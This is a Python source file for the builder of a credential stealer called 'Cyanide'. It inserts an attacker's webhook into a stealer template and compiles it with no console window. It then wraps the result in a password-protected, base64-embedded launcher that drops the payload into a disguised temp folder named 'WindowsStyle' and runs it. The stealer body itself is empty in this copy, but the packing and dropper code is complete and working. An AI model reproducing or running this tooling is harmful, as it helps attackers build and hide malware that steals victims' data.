import string
import random
import click
import os
import shutil
import zipfile

from core.logs import banner

from colorama import Fore
from base64 import standard_b64encode as b64encode
from base64 import standard_b64decode as b64decode

launcher = r"""import tempfile
import os
import base64

from zipfile import ZipFile

temp = tempfile.NamedTemporaryFile("wb", delete=False, suffix=".zip")

dirtemp = "WindowsStyle"
dirtempPath = os.path.join( os.path.dirname(os.path.abspath(temp.name)), dirtemp )

base64zip = %b64zip%
filexec = %filexec%
password = %password%

try:
    temp.write(base64.standard_b64decode(base64zip))
finally:
    temp.close()

    if not os.path.exists(dirtempPath): os.mkdir(dirtempPath)

    with ZipFile(temp.name, "r") as archive:
        archive.setpassword(password)
        archive.extractall(dirtempPath)


    os.system(os.path.join(dirtempPath, filexec))
    os.remove(temp.name)"""

mainApp = r""


def get_random_string(length=10) -> bytes:
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str.encode()

def zipfolder(foldername, target_dir, password: bytes):
    zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
    zipobj.setpassword(password)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            zipobj.write(fn, fn[rootlen:])


@click.command()
@click.argument("webhook", required=1, type=str)
@click.option('-o', "--output", type=str, required=1, help="Output file")

def builder(webhook, output):
    password = get_random_string(20)

    stealerpy = output+".py"
    stealerzip = output+".zip"

    launcherpy = output+".l"

    banner.builder()
    print(f"{'-'*30} Configure Cyanide... {'-'*30}")
    
    print(f"[{Fore.GREEN}${Fore.RESET}] Adding webhook...")
    template = b64decode(mainApp.encode()).decode().replace(r"%webhook%", webhook)
    
    print(f"[{Fore.GREEN}${Fore.RESET}] Writing Cyanice...")
    
    with open(stealerpy, "w") as f:
        f.write(template)
    
    print(f"{'-'*30} Compiling Cyanide... {'-'*30}")
    os.system("pyinstaller --noconsole "+stealerpy)
    os.remove(stealerpy)

    print(f"{'-'*30} Configure launcher... {'-'*30}")
    print(f"[{Fore.CYAN}*{Fore.RESET}] Folder zipping...")
    zipfolder(output, os.path.join("dist", output), password)

    zipbase64 = b64encode(open(stealerzip, "rb").read())
    os.remove(stealerzip)

    print(f"[{Fore.CYAN}*{Fore.RESET}] Setup launcher...")
    template = launcher.replace(r"%b64zip%", 'b"'+zipbase64.decode()+'"')
    template = template.replace(r"%password%", 'b"'+password.decode()+'"')
    template = template.replace(r"%filexec%", '"'+output+".exe"+'"')
    
    print(f"[{Fore.GREEN}${Fore.RESET}] Writing launcher...")
    with open(launcherpy, "w") as f:
        f.write(template)
    
    print(f"[{Fore.CYAN}*{Fore.RESET}] Converting to exe...")
    os.system("pyinstaller --onefile --noconsole "+launcherpy)
    os.remove(launcherpy)
    shutil.move(os.path.join("dist", output+".exe"), ".")

    shutil.rmtree("build")
    shutil.rmtree("dist")
    os.remove(output+".spec")

if __name__ == "__main__":
    builder()